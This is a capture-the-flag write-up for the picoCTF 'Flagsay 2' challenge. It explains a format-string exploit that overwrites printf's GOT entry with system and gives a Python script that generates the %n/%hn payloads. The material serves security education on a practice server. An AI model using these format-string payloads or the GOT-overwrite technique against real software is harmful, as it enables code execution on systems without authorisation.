# Flagsay 2 - 150 Points
Apparently I messed up using system(). I'm pretty sure this one is secure though! I hope [flagsay-2](https://webshell2017.picoctf.com/static/22fa9a9c19a1e1e832f05a57be962664/flagsay-2) is just as exhilarating as the the first one! [Source](https://webshell2017.picoctf.com/static/22fa9a9c19a1e1e832f05a57be962664/flagsay-2.c). Connect on shell2017.picoctf.com:40672.

## Write-up
Despite its similarity, this has almost nothing to do with the first flagsay --- or does it? This flagsay has another type of exploitation, known as a print format exploit. The only one small problem we have is that we don't have a pointer to the buffer like we did in configure console. This means we can't use addresses within our buffer to read arbitrary memory. But fear not! We have yet another pointer. Within the start up code, there was some pointers that were given in order to supply that argv thingy! There's a lot of pointers in there directly on the stack! 

We then use those to override the GOT table for printf. Also in this problem, the hint says that we have to use the `$` and `hn` for `printf` to work this time. The $ (i.e. `%n$x`) allowed you to refer to the *n*th argument, and the `hn` allows you to just write a `short` (16-bit integer) to memory. Now I happened to override the address of `printf` to another function called `system` since both of these functions have exactly ONE string argument. Now, in the end, indeed, the resulting logic doesn't look so different after all... Here's the python script:
```python
while True:
  print("%2$x\n%134519023c%22$n33%21$n")
  hex = int(raw_input("cin value > "), 16) - 0x16B840

  lower = hex & 0xffff
  upper = (hex >> 16) & 0xffff
  upper -= lower
  lower -= 129

  if upper < 0:
    raise ValueError()

  print("%" + str(lower) + "c%29$hn%" + str(upper) + "c%53$hn")
  print
```